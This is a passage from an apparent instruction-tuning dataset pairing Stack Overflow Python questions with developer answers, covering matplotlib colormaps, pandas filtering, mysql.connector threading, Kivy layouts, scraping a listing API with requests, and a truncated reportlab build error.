repeated:<\/p>\n<pre><code>array([[  0,  82, 246, 255],\n       [  0,  82, 246, 255],\n       [  0, 196, 196, 255],\n       [  0, 196, 196, 255],\n       [  0, 137,  83, 255],\n       [  0, 137,  83, 255],\n       [  1, 233,  11, 255],\n       [  1, 233,  11, 255],\n       [234, 255,  31, 255],\n       [234, 255,  31, 255],\n       [255, 176,   0, 255],\n       [255, 176,   0, 255],\n       [247,  18,   0, 255],\n       [247,  18,   0, 255],\n       [193,   0,  76, 255],\n       [193,   0,  76, 255],\n       [255,   0, 255, 255],\n       [255,   0, 255, 255]], dtype=uint8)\n<\/code><\/pre>\n<p>How can I get the expected behaviour, with the colours I originally I had, plus others in the middle?<\/p>","output_text":"<p>Your &quot;expected&quot; behavior isn't possible: if you have 9 colors, and you take 18 equally spaced interpolated values, only the first and the last value will come from your initial set. To have your initial set as part of the list, you need a multiple minus one.<\/p>\n<p>The input to <code>LinearSegmentedColormap.from_list()<\/code> can't be rgb values in the range 0-255: they need to be float values in the range 0-1. Also, the <code>N=<\/code> parameter will be the number of internally stored values. If you set <code>N<\/code> equal to the original number of colors, no interpolated colors will be calculated. For most flexibility you can set N to 256.<\/p>\n<p>Afterwards, you can multiply the values again by 255 to get rgb values in the range 0-255.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from matplotlib.colors import LinearSegmentedColormap\nimport numpy as np\n\ncolors = [[0, 82, 246, 255],\n          [0, 196, 196, 255],\n          [0, 137, 83, 255],\n          [1, 233, 11, 255],\n          [234, 255, 31, 255],\n          [255, 176, 0, 255],\n          [247, 19, 0, 255],\n          [193, 0, 76, 255],\n          [255, 0, 255, 255]]\n\ncm = LinearSegmentedColormap.from_list('', np.array(colors) \/ 255, 256)\ncolors_18 = (cm(np.linspace(0, 1, len(colors) * 2)) * 255).astype(np.uint8)\ncolors_17 = (cm(np.linspace(0, 1, len(colors) * 2 - 1)) * 255).astype(np.uint8)\n<\/code><\/pre>\n<p>colors_18:<\/p>\n<pre><code>array([[  0,  82, 246, 255],\n       [  0, 135, 222, 255],\n       [  0, 189, 198, 255],\n       [  0, 171, 149, 255],\n       [  0, 143,  96, 255],\n       [  0, 170,  57, 255],\n       [  0, 216,  23, 255],\n       [ 69, 239,  16, 255],\n       [179, 249,  26, 255],\n       [238, 236,  23, 255],\n       [248, 199,   9, 255],\n       [253, 148,   0, 255],\n       [249,  74,   0, 255],\n       [240,  16,   8, 255],\n       [215,   7,  44, 255],\n       [196,   0,  86, 255],\n       [225,   0, 170, 255],\n       [255,   0, 255, 255]], dtype=uint8)\n<\/code><\/pre>\n<p>colors_17:<\/p>\n<pre><code>array([[  0,  82, 246, 255],\n       [  0, 139, 220, 255],\n       [  0, 195, 195, 255],\n       [  0, 166, 138, 255],\n       [  0, 137,  82, 255],\n       [  0, 185,  46, 255],\n       [  3, 233,  11, 255],\n       [120, 244,  21, 255],\n       [234, 253,  30, 255],\n       [244, 214,  14, 255],\n       [254, 172,   0, 255],\n       [250,  94,   0, 255],\n       [245,  18,   1, 255],\n       [218,   9,  39, 255],\n       [194,   0,  80, 255],\n       [225,   0, 170, 255],\n       [255,   0, 255, 255]], dtype=uint8)\n<\/code><\/pre>\n<p>To use colors in other applications, matplotlib also provides a <code>to_hex<\/code> function (which doesn't work on arrays, only on individual colors):<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from matplotlib.colors import to_hex\ncolors_18_hex = [to_hex(cm(v)) for v in np.linspace(0, 1, len(colors) * 2)]\n# ['#0052f6', '#0088de', '#00bdc7', '#00ac95', '#009060', '#00ab3a', '#01d818', '#46ef11', '#b3fa1a', '#efec18', '#f9c709', '#fe9400', '#fa4a00', '#f11109', '#d7082d', '#c50057', '#e200ab', '#ff00ff']&quot;\n<\/code><\/pre>\n<p>Here is a plot to show how the interpolation goes on:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from matplotlib import pyplot as plt\nfrom matplotlib.colors import LinearSegmentedColormap\nimport numpy as np\n\ncolors = np.array([[0, 82, 246, 255], [0, 196, 196, 255], [0, 137, 83, 255], [1, 233, 11, 255], [234, 255, 31, 255], [255, 176, 0, 255], [247, 19, 0, 255], [193, 0, 76, 255], [255, 0, 255, 255]])\n\nfig, axs = plt.subplots(nrows=3, figsize=(15, 5))\n\nplt.colorbar(ScalarMappable(cmap=LinearSegmentedColormap.from_list('', colors \/ 255, len(colors))),\n             ticks=np.linspace(0, 1, len(colors)), orientation='horizontal', cax=axs[0])\naxs[0].set_title(&quot;9 colors, no interpolation&quot;)\n\nplt.colorbar(ScalarMappable(cmap=LinearSegmentedColormap.from_list('', colors \/ 255, 256)),\n             ticks=np.linspace(0, 1, len(colors) * 2 - 1), orientation='horizontal', cax=axs[1])\naxs[1].set_title(&quot;positions of 17 colors&quot;)\naxs[1].xaxis.grid(True, ls='--')\n\nplt.colorbar(ScalarMappable(cmap=LinearSegmentedColormap.from_list('', colors \/ 255, 256)),\n             ticks=np.linspace(0, 1, len(colors) * 2), orientation='horizontal', cax=axs[2])\naxs[2].set_title(&quot;positions of 18 colors&quot;)\naxs[2].xaxis.grid(True, ls='--')\n\nplt.tight_layout()\nplt.show()\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/1j3GK.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/1j3GK.png\" alt=\"linear segmented colormap from list\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to compare various specific cells in a DataFrame (in a relative manner)?<p>I got a DataFrame that loks like this: <\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/EcokH.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/EcokH.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>I'd like to add a new column that checks for each row if the \"attributes.count\" in the current and also the 5 previous rows stays at zero. If so, I want it to return True. In Excel I would simply use realtive references for the last 5 cells, but I didn't find anything like that for pandas. <\/p>\n\n<p>So if I am in row 55, I just want to check if the rows 50 to 55 contain nothing but zeros and, if so, return True.<\/p>\n\n<p>I experimented with the .diff() method but that doesn't really do the trick, since it only checks the previous row and not a certain amount of prevous rows all together: <\/p>\n\n<pre><code>df[\"Is zero?\"] = df[\"attributes.count\"].diff()\n<\/code><\/pre>\n\n<p>Is there any workaround for this? Or maybe even a specific method I don't know of yet?\n(I'm an absolute beginner both in regards to coding and Python, so please forgive my stupidity :D )<\/p>","output_text":"<p>Just use rolling with sum. <\/p>\n\n<pre><code>df = pd.DataFrame(\n    {\"attributes_count\": [0, 0, 0, 0, 0, 1, 2, 0, 0, 0, 0, 0, 0, 0, 3, 1]}\n)\nprint(df)\n    attributes_count\n0                  0\n1                  0\n2                  0\n3                  0\n4                  0\n5                  1\n6                  2\n7                  0\n8                  0\n9                  0\n10                 0\n11                 0\n12                 0\n13                 0\n14                 3\n15                 1\n<\/code><\/pre>\n\n<p>Then create a new column using rolling over 5 period window and summing. If it sums to zero then that is True.<\/p>\n\n<pre><code>df[\"Is zero?\"] = df[\"attributes_count\"].rolling(5).sum()\nprint(df)\n    attributes_count  Is zero?\n0                  0       nan\n1                  0       nan\n2                  0       nan\n3                  0       nan\n4                  0    0.0000\n5                  1    1.0000\n6                  2    3.0000\n7                  0    3.0000\n8                  0    3.0000\n9                  0    3.0000\n10                 0    2.0000\n11                 0    0.0000\n12                 0    0.0000\n13                 0    0.0000\n14                 3    3.0000\n15                 1    4.0000\n<\/code><\/pre>\n\n<p>Unforunately the true and false are flipped backwords. So we need to make 0 be 1.<\/p>\n\n<pre><code>df[\"Is zero?\"] = np.where(df[\"Is zero?\"], 0, 1)\nprint(df)\n   attributes_count  Is zero?\n0                  0         0\n1                  0         0\n2                  0         0\n3                  0         0\n4                  0         1\n5                  1         0\n6                  2         0\n7                  0         0\n8                  0         0\n9                  0         0\n10                 0         0\n11                 0         1\n12                 0         1\n13                 0         1\n14                 3         0\n15                 1         0\n\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to use multiple cursors in mysql.connector?<p>I want to execute multiple queries without each blocking other. I created multiple cursors and did the following but got <code>mysql.connector.errors.OperationalError: 2013 (HY000): Lost connection to MySQL server during query<\/code><\/p>\n\n<pre><code>import mysql.connector as mc\nfrom threading import Thread\n\nconn = mc.connect(#...username, password)\ncur1 = conn.cursor()\ncur2 = conn.cursor()\n\ne1 = Thread(target=cur1.execute, args=(\"do sleep(30)\",)) # A 'time taking' task\ne2 = Thread(target=cur2.execute, args=(\"show databases\",)) # A simple task\n\ne1.start()\ne2.start()\n<\/code><\/pre>\n\n<p>But I got that OperationalError. And reading a few other questions, some suggest that using multiple connections is better than multiple cursors. So shall I use multiple connections?<\/p>","output_text":"<p>I don't have the full context of your situation to understand the performance considerations. Yes, starting a new connection could be considered heavy if you are operating under strict timing constraints that are short relative to the time it takes to start a new connection and you were forced to do that for every query...<\/p>\n\n<p>But you can mitigate that with a shared connection <a href=\"https:\/\/dev.mysql.com\/doc\/connector-python\/en\/connector-python-connection-pooling.html\" rel=\"nofollow noreferrer\">pool<\/a> that you create ahead of time, and then distribute your queries (in separate threads) over those connections as resources allow.<\/p>\n\n<p>On the other hand, if all of your query times are fairly long relative to the time it takes to create a new connection, and you aren't looking to run more than a handful of queries in parallel, then it can be a reasonable option to create connections on demand. Just be aware that you will run into limits with the number of open connections if you try to go too far, as well as resource limitations on the database system itself. You probably don't want to do something like that against a shared database. Again, this is only a reasonable option within some very specific contexts.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Is there a way to keep a subset of each group for a pandas groupby object?<p>I have a dataframe that looks like this:<\/p>\n\n<pre><code>   id        date  isActive\n0   1  2019-01-01         0\n1   1  2019-01-02         1\n2   1  2019-01-03         1\n3   1  2019-01-04         0\n4   1  2019-01-05         0\n5   2  2019-01-01         0\n6   2  2019-01-02         1\n7   2  2019-01-03         0\n8   2  2019-01-04         1\n9   2  2019-01-05         0\n<\/code><\/pre>\n\n<p>I want to filter out all inactive (<em>isActive<\/em>=0) rows for each id, unless the most recent rows for that id are inactive. Afterwards, my dataframe should look like this:<\/p>\n\n<pre><code>   id        date  isActive\n0   1  2019-01-02         1\n1   1  2019-01-03         1\n2   1  2019-01-04         0\n3   1  2019-01-05         0\n4   2  2019-01-02         1\n5   2  2019-01-04         1\n6   2  2019-01-05         0\n<\/code><\/pre>\n\n<hr>\n\n<p>I thought I should try keeping all of the active rows, along with the rows associated with last set of consecutive <em>isActive<\/em> values for each id. To do this, I tried creating a flag that indicates when the <em>isActive<\/em> variable changes, then tried getting the size of each of those groups:<\/p>\n\n<pre><code>df['flag'] = df.groupby(['id', df['isActive'].eq(1).cumsum()])['isActive'].transform('size')\n<\/code><\/pre>\n\n<p>Then, I tried using <code>apply<\/code> and <code>tail<\/code> to keep each row that satisfied the conditions mentioned above, but I realized I can't just access the <em>flag<\/em> value of the last column:<\/p>\n\n<pre><code>df.groupby(['ID']).apply(lambda x: (x['Status'].eq(2)) | (x['Status'].tail(x['flag'])))\nValueError: The truth value of a Series is ambiguous. Use a.empty, a.bool(), a.item(), a.any() or a.all().\n<\/code><\/pre>\n\n<p>I think I may be overthinking this problem. Is there some better approach out there?<\/p>","output_text":"<p>Check if <code>isActive<\/code> is 0 and take the cummulative product from the bottom within group. This will give you <code>True<\/code> for the last streak of 0s (if any). Combine that with all the rows that are <code>1<\/code> and you have your total mask.<\/p>\n\n<pre><code># Assumes sorted by date within each id\nm = (df['isActive'].eq(0)[::-1].groupby(df['id']).cumprod().sort_index()\n     | df['isActive'].eq(1))\n\ndf[m]\n   id        date  isActive\n1   1  2019-01-02         1\n2   1  2019-01-03         1\n3   1  2019-01-04         0\n4   1  2019-01-05         0\n6   2  2019-01-02         1\n8   2  2019-01-04         1\n9   2  2019-01-05         0\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How do i extract certain values in a row satisfying a condition in a dataframe?<p>I have a DataFrame looking something like this -<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/TUpXQ.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/TUpXQ.jpg\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>Now , how do i extract all the elements in row A having a value greater than 2 ?<\/p>\n\n<p>In the above case it would be the value 2.706850<\/p>\n\n<p>I did something like this-<\/p>\n\n<p><code>df.loc['A']&gt;2<\/code><\/p>\n\n<p>But i got a series containing Boolean Values something like this -<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/yBBEP.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/yBBEP.jpg\" alt=\"enter image description here\"><\/a><\/p>\n\n<p><strong>What should i do to get 2.706850 as the output ?<\/strong><\/p>","output_text":"<h3>Recommended solution<\/h3>\n\n<p>You can index the dataframe with the conditional expression and the series label itself:<\/p>\n\n<pre><code>df.loc[df.loc['A'] &gt; 2, 'A']\n<\/code><\/pre>\n\n<hr>\n\n<h3>Old answer, not recommended<\/h3>\n\n<blockquote>\n  <p>Avoid using this approach as it encourages chained assignment. Check the following <a href=\"https:\/\/stackoverflow.com\/questions\/20625582\/how-to-deal-with-settingwithcopywarning-in-pandas\/53954986#53954986\">answer<\/a> for more details<\/p>\n<\/blockquote>\n\n<p>You just need to index back into the series with your boolean mask as follows:<\/p>\n\n<pre><code>&gt;&gt;&gt; df.loc['A'][df.loc['A'] &gt; 2]\nF    2.706850\nName: A, dtype: float64\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Re: Setting different color for error bars in matplotlib<p>I'm currently running with a little bit of trouble with regards to setting a range of colors for my errors bars. Apparently, it looks like there are two error bars imposed to one another. One is color Orange while the other is Red. For reference, I followed the steps from this post: <a href=\"https:\/\/stackoverflow.com\/questions\/21912197\/setting-different-error-bar-colors-in-bar-plot-in-matplotlib\">Setting Different error bar colors in bar plot in matplotlib<\/a> and tweaked to fit in. Is there a way to resolve the small issue?<\/p>\n<p>I'll also include the <a href=\"https:\/\/drive.google.com\/file\/d\/1_89NPkTO2fJSTlK362r4oCJw32Zrgw87\/view?usp=sharing\" rel=\"nofollow noreferrer\">.csv file for usage<\/a>. At the moment, the code runs like this:<\/p>\n<pre><code>import matplotlib.pyplot as plt\nimport numpy as np\nimport pandas as pd\nfrom scipy.stats import linregress\n\ndf = pd.read_csv('Regression.csv') \ndf.head()\n\nA = df['Period'] #Period in Days \nB = df['Luminosity'] #Luminosity is already Logarithmic prior to calculation\ncolors = ['red', 'orange', 'forestgreen', 'teal', 'navy', 'darkorchid'] #range of colors\n\n#Luminosity Uncertainties\nylower_error = df['-dY lum'] #lower limit\nyupper_error = df['+dY lum'] #upper limit\nyasymmetric_error = [ylower_error, yupper_error]\n\n#Regression space\nslope, intercept, r_value, p_value, std_err = linregress(np.log10(A+1), np.array(B))\n\nxfid = np.linspace(2,3)   # This is just a set of x to plot the straight line \n\n#Plotting the overall data\nfig, ax = plt.subplots(figsize=(12, 10))\n\nax.scatter(np.log10(A), np.array(B), marker='*', s=300, color=colors)\nax.plot(xfid, xfid*slope+intercept,  '-.', c='royalblue', linewidth=3, zorder=0)\nax.set_xlim([2.46, 2.77]) #X-Limits\nax.set_ylim([4.35, 5.45]) #Y-Limits\n\n#Setting the range of colors for the error bar. This one came from the reference post.\nfor yerr, color in zip(yasymmetric_error, colors):\n    ax.errorbar(np.log10(A), np.array(B), yerr, lw=2, capsize=3, \n                capthick=2, ls='none', ecolor=color)\n\nplt.rcParams['axes.linewidth'] = 4\nplt.tight_layout()\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/9pXRh.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/9pXRh.jpg\" alt=\"enter image description here\" \/><\/a><\/p>","output_text":"<p>The loop should enumerate the components individually. The idea is that each error bar is plotted separately, so in each iteration you plot a single combination of <code>x<\/code>, <code>y<\/code>, <code>lower<\/code>, <code>upper<\/code>, and <code>color<\/code>:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>for x, y, lower, upper, color in zip(np.log10(A), np.array(B), ylower_error, yupper_error, colors):\n    ax.errorbar(x, y, yerr=np.array([[lower], [upper]]), lw=2, capsize=3, \n                capthick=2, ls='none', ecolor=color)\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/TwGJg.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/TwGJg.png\" alt=\"individually colored error bar\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python pandas: oposite of pandas.Series.str.match<p>How to Determine if each string in a column does not start with a match of a regular expression.<\/p>\n<p>I need to check when a Column does NOT equal a string.<\/p>\n<p>I've found:<\/p>\n<pre><code>pandas.Series.str.match\n<\/code><\/pre>\n<p>And it is almost what I need, but I want to get True when the string is NOT a match<\/p>","output_text":"<p>You can check with <code>pd.Series.str.startswith<\/code><\/p>\n<pre><code>df_sub = df[~df['col'].str.startswith('your str')]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Web Scraping Identifying executing and troubleshooting a request<p>I am having some trouble scraping data from the following website:<\/p>\n<blockquote>\n<p>https:\/\/www.loft.com.br\/apartamentos\/sao-paulo-sp?q=pin<\/p>\n<\/blockquote>\n<p>When we load the page, it loads the first ~30 posts on real state in the city of Sao Paulo.\nIf we scroll down, it loads more posts.<\/p>\n<p>Usually I would use selenium to get around this - but I want to learn how to do it properly - I imagine that is by fiddling with requests.<\/p>\n<p>By using inspect on chrome, and watching for what happens when we scroll down, I can see a request made which I presume is what retrieves the new posts.<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/t9Lrb.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/t9Lrb.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>If I copy its content as curl, I get the following command:<\/p>\n<pre><code>curl &quot;https:\/\/landscape-api.loft.com.br\/listing\/search?city=S^%^C3^%^A3o^%^20Paulo^&amp;facetFilters^\\[^\\]=address.city^%^3AS^%^C3^%^A3o^%^20Paulo^&amp;limit=18^&amp;limitedColumns=true^&amp;loftUserId=417b37df-19ab-4014-a800-688c5acc039d^&amp;offset=28^&amp;orderBy^\\[^\\]=rankB^&amp;orderByStatus=^%^27FOR_SALE^%^27^%^2C^%^20^%^27JUST_LISTED^%^27^%^2C^%^20^%^27DEMOLITION^%^27^%^2C^%^20^%^27COMING_SOON^%^27^%^20^%^2C^%^20^%^27SOLD^%^27^&amp;originType=LISTINGS_LOAD_MORE^&amp;q=pin^&amp;status^\\[^\\]=FOR_SALE^&amp;status^\\[^\\]=JUST_LISTED^&amp;status^\\[^\\]=DEMOLITION^&amp;status^\\[^\\]=COMING_SOON^&amp;status^\\[^\\]=SOLD&quot; ^\n  -X &quot;OPTIONS&quot; ^\n  -H &quot;Connection: keep-alive&quot; ^\n  -H &quot;Accept: *\/*&quot; ^\n  -H &quot;Access-Control-Request-Method: GET&quot; ^\n  -H &quot;Access-Control-Request-Headers: loft_user_id,loftuserid,utm_campaign,utm_content,utm_created_at,utm_id,utm_medium,utm_source,utm_term,utm_user_agent,x-user-agent,x-utm-source,x-utm-user-id&quot; ^\n  -H &quot;Origin: https:\/\/www.loft.com.br&quot; ^\n  -H &quot;User-Agent: Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/87.0.4280.141 Safari\/537.36&quot; ^\n  -H &quot;Sec-Fetch-Mode: cors&quot; ^\n  -H &quot;Sec-Fetch-Site: same-site&quot; ^\n  -H &quot;Sec-Fetch-Dest: empty&quot; ^\n  -H &quot;Referer: https:\/\/www.loft.com.br\/&quot; ^\n  -H &quot;Accept-Language: en-US,en;q=0.9&quot; ^\n  --compressed\n<\/code><\/pre>\n<p>I am unsure which would be the proper way to convert this to a command to be used in python module <strong>requests<\/strong> - so I used this website - <a href=\"https:\/\/curl.trillworks.com\/\" rel=\"nofollow noreferrer\">https:\/\/curl.trillworks.com\/<\/a> - to do it.<\/p>\n<p>The result is:<\/p>\n<pre><code>import requests\n\nheaders = {\n    'Connection': 'keep-alive',\n    'Accept': '*\/*',\n    'Access-Control-Request-Method': 'GET',\n    'Access-Control-Request-Headers': 'loft_user_id,loftuserid,utm_campaign,utm_content,utm_created_at,utm_id,utm_medium,utm_source,utm_term,utm_user_agent,x-user-agent,x-utm-source,x-utm-user-id',\n    'Origin': 'https:\/\/www.loft.com.br',\n    'User-Agent': 'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/87.0.4280.141 Safari\/537.36',\n    'Sec-Fetch-Mode': 'cors',\n    'Sec-Fetch-Site': 'same-site',\n    'Sec-Fetch-Dest': 'empty',\n    'Referer': 'https:\/\/www.loft.com.br\/',\n    'Accept-Language': 'en-US,en;q=0.9',\n}\n\nparams = (\n    ('city', 'S\\xE3o Paulo'),\n    ('facetFilters\/[\/]', 'address.city:S\\xE3o Paulo'),\n    ('limit', '18'),\n    ('limitedColumns', 'true'),\n    ('loftUserId', '417b37df-19ab-4014-a800-688c5acc039d'),\n    ('offset', '28'),\n    ('orderBy\/[\/]', 'rankB'),\n    ('orderByStatus', '\\'FOR_SALE\\', \\'JUST_LISTED\\', \\'DEMOLITION\\', \\'COMING_SOON\\' , \\'SOLD\\''),\n    ('originType', 'LISTINGS_LOAD_MORE'),\n    ('q', 'pin'),\n    ('status\/[\/]', ['FOR_SALE', 'JUST_LISTED', 'DEMOLITION', 'COMING_SOON', 'SOLD']),\n)\n\nresponse = requests.options('https:\/\/landscape-api.loft.com.br\/listing\/search', headers=headers, params=params)\n<\/code><\/pre>\n<p>However, when I try to run it, I get a <strong>204<\/strong>.<\/p>\n<p>So my questions are:<\/p>\n<ol>\n<li>What is the proper\/best way to identify requests from this website? Are there any better alternatives to what I did?<\/li>\n<li>Once identified, is copy as curl the best way to replicate the command?<\/li>\n<li>How to best replicate the command in Python?<\/li>\n<li>Why am I getting a 204?<\/li>\n<\/ol>","output_text":"<p>Your way to find requests is correct. But you need to find and analyze correct requests.<br>\nAbout why you get 204 response code with no results; you send <code>OPTION<\/code> requests instead of <code>GET<\/code>. In Chrome DevTools you can see two similar requests (check attached picture). One is <code>OPTION<\/code> and second one is <code>GET<\/code> with type <a href=\"https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/API\/XMLHttpRequest\" rel=\"nofollow noreferrer\">xhr<\/a>.<br>\nFor the website you need the second one, but you used <code>OPTION<\/code> in your code <code>requests.options(..)<\/code>\n<a href=\"https:\/\/i.stack.imgur.com\/yEPUV.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/yEPUV.png\" alt=\"enter image description here\" \/><\/a>\nTo see response of the request select it and check response or preview tab. <a href=\"https:\/\/i.stack.imgur.com\/Kysgi.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/Kysgi.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>One of the best HTTP libraries in Python is <a href=\"\/questions\/tagged\/requests\" class=\"post-tag\" title=\"show questions tagged &#39;requests&#39;\" rel=\"tag\">requests<\/a>.<\/p>\n<p>And here's complete code to get all search results:<\/p>\n<pre><code>import requests\n\nheaders = {\n    'x-user-agent': 'Mozilla\/5.0 (Macintosh; Intel Mac OS X 11_2_0) AppleWebKit\/537.36 (KHTML, like Gecko) '\n                    'Chrome\/88.0.4324.146 Safari\/537.36',\n    'utm_created_at': '',\n    'Accept': 'application\/json, text\/plain, *\/*',\n}\n\nwith requests.Session() as s:\n    s.headers = headers\n\n    listings = list()\n    limit = 18\n    offset = 0\n    while True:\n        params = {\n            &quot;city&quot;: &quot;S\u00e3o Paulo&quot;,\n            &quot;facetFilters\/[\/]&quot;: &quot;address.city:S\u00e3o Paulo&quot;,\n            &quot;limit&quot;: limit,\n            &quot;limitedColumns&quot;: &quot;true&quot;,\n            # &quot;loftUserId&quot;: &quot;a2531ad4-cc3f-49b0-8828-e78fb489def8&quot;,\n            &quot;offset&quot;: offset,\n            &quot;orderBy\/[\/]&quot;: &quot;rankA&quot;,\n            &quot;orderByStatus&quot;: &quot;\\'FOR_SALE\\', \\'JUST_LISTED\\', \\'DEMOLITION\\', \\'COMING_SOON\\' , \\'SOLD\\'&quot;,\n            &quot;originType&quot;: &quot;LISTINGS_LOAD_MORE&quot;,\n            &quot;q&quot;: &quot;pin&quot;,\n            &quot;status\/[\/]&quot;: [&quot;FOR_SALE&quot;, &quot;JUST_LISTED&quot;, &quot;DEMOLITION&quot;, &quot;COMING_SOON&quot;, &quot;SOLD&quot;]\n        }\n        r = s.get('https:\/\/landscape-api.loft.com.br\/listing\/search', params=params)\n        r.raise_for_status()\n\n        data = r.json()\n        listings.extend(data[&quot;listings&quot;])\n\n        offset += limit\n        total = data[&quot;pagination&quot;][&quot;total&quot;]\n        if len(data[&quot;listings&quot;]) == 0 or len(listings) == total:\n            break\n\nprint(len(listings))\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Kivy anchor two widget at each side<p>I'm trying to do a video on top of a graph, with two buttons controlling the graph. I'd like one button to be at the left of the window, the other one at the right, both on the same row, and my problem is placing the - and + buttons.\nI have the following kv file, the concerned buttons are the two Control class:<\/p>\n\n<pre><code>#:kivy 1.0.9\n\n&lt;Control&gt;\n\n    canvas:\n        Rectangle:\n            size: 5, 5\n            pos: self.pos\n\n\n\n&lt;VideoWidget&gt;:\n    video_player: video_handler\n    graph: graph_handler\n    data_plus: ctr_plus_handler\n    data_minus: ctr_minus_handler\n\n    BoxLayout:\n        orientation: 'vertical'\n\n        VideoHandler:\n            id: video_handler\n            state: 'play'\n            options: {'allow_stretch': True}\n            size_hint: 1, 0.45\n            on_touch_down: root.test()\n            on_position: root.move()\n\n        BoxLayout:\n            size_hint: 1, 0.1\n            orientation: 'horizontal'\n\n            Control:\n                id: ctr_minus_handler\n                size_hint: 0.1, 1\n\n                pos_hint: {'left': 0.1}\n\n\n            Control:\n                id: ctr_plus_handler\n                size_hint: 0.1, 1\n                pos_hint: {'right': 0.1}\n\n\n\n        GraphWidget:\n            id: graph_handler\n            size_hint: 1, 0.45\n\n\n\n<\/code><\/pre>\n\n<p>But both Control are taking half the width of the row, whatever I change... Any ideas ?<\/p>","output_text":"<p>You can use an empty <code>Widget<\/code> to fill the blank space between the <code>Controls<\/code> like this:<\/p>\n\n<pre><code>    BoxLayout:\n        size_hint: 1, 0.1\n        orientation: 'horizontal'\n\n        Control:\n            id: ctr_minus_handler\n            size_hint: 0.1, 1\n        Widget:\n            size_hint: 0.8, 1\n        Control:\n            id: ctr_plus_handler\n            size_hint: 0.1, 1\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Reportlab installation failed after upgrading to Macos Big Sur<p>I'm trying to reinstall my virtual env after upgrade to MacOS Big Sur.<\/p>\n<p>But error appears:<\/p>\n<pre><code>4 warnings generated.\n    clang -Wno-unused-result -Wsign-compare -Wunreachable-code -fno-common -dynamic -DNDEBUG -g -fwrapv -O3 -Wall -isysroot \/Library\/Developer\/CommandLineTools\/SDKs\/MacOSX11.0.sdk -I\/Library\/Developer\/CommandLineTools\/SDKs\/MacOSX11.0.sdk\/usr\/include -I\/Library\/Developer\/CommandLineTools\/SDKs\/MacOSX11.0.sdk\/System\/Library\/Frameworks\/Tk.framework\/Versions\/8.5\/Headers -Qunused-arguments -Qunused-arguments -DRENDERPM_FT -DLIBART_COMPILATION -DLIBART_VERSION=2.3.21 -Isrc\/rl_addons\/renderPM -Isrc\/rl_addons\/renderPM\/libart_lgpl -Isrc\/rl_addons\/renderPM\/gt1 -I\/usr\/local\/include\/freetype2 -I\/usr\/local\/include -I\/usr\/local\/opt\/openssl@1.1\/include -I\/usr\/local\/opt\/sqlite\/include -I\/Users\/zulfugar\/PycharmProjects\/AppForm\/.venv\/include -I\/usr\/local\/Cellar\/python@3.8\/3.8.6_1\/Frameworks\/Python.framework\/Versions\/3.8\/include\/python3.8 -c src\/rl_addons\/renderPM\/gt1\/gt1-parset1.c -o build\/temp.macosx-11.0-x86_64-3.8\/src\/rl_addons\/renderPM\/gt1\/gt1-parset1.o\n    src\/rl_addons\/renderPM\/gt1\/gt1-parset1.c:604:28: warning: for loop has empty body [-Wempty-body]\n            for (i = 0; i &lt; size; i++);\n                                      ^\n    src\/rl_addons\/renderPM\/gt1\/gt1-parset1.c:604:28: note: put the semicolon on a separate line to silence this warning\n    src\/rl_addons\/renderPM\/gt1\/gt1-parset1.c:1907:16: warning: comparison of integers of different signs: 'int' and 'unsigned long' [-Wsign-compare]\n            for (i = 0; i &lt; sizeof(internal_procs) \/ sizeof(InternalGt1ProcListing); i++)\n                        ~ ^ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    